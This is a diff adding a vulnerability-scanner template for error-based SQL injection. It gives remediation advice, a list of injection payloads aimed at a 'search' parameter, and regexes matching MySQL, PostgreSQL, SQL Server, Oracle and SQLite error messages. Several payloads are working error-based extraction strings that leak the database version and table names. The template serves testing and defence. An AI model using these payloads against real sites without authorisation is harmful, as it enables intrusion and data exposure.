@@ -1,0 +1,45 @@
+id: sqli-error-payloads
+info:
+  name: SQL Injection – Error-Based (Payload List)
+  severity: critical
+  tags: [sqli, injection, error-based]
+  description: "Injecting common SQL error-based payloads into the search query parameter triggered a database error message, confirming that unsanitized user input reaches a SQL query directly."
+  remediation: "Use parameterized queries or prepared statements for every database interaction. Never interpolate user input directly into SQL. Apply an allowlist on expected input format (e.g. reject single quotes in a numeric ID field)."
+  cwe: "CWE-89"
+  owasp: "A03:2021-Injection"
+
+payloads:
+  injection:
+    - "'"
+    - "'--"
+    - "')"
+    - "');--"
+    - "' AND 1=CONVERT(int,@@version)--"
+    - "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+    - "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--"
+    - "' AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
+
+requests:
+  - method: GET
+    path: "/?search={{injection}}"
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysql_"
+          - "valid MySQL result"
+          - "MySqlClient\\."
+          - "PostgreSQL.*ERROR"
+          - "Warning.*pg_"
+          - "valid PostgreSQL result"
+          - "Npgsql\\."
+          - "Driver.*SQL.*Server"
+          - "OLE DB.*SQL Server"
+          - "\\[SQL Server\\]"
+          - "Unclosed quotation mark after the character string"
+          - "quoted string not properly terminated"
+          - "ORA-[0-9]{4,5}:"
+          - "Microsoft OLE DB Provider for Oracle"
+          - "SQLite.*error"
+          - "SQLITE_ERROR"
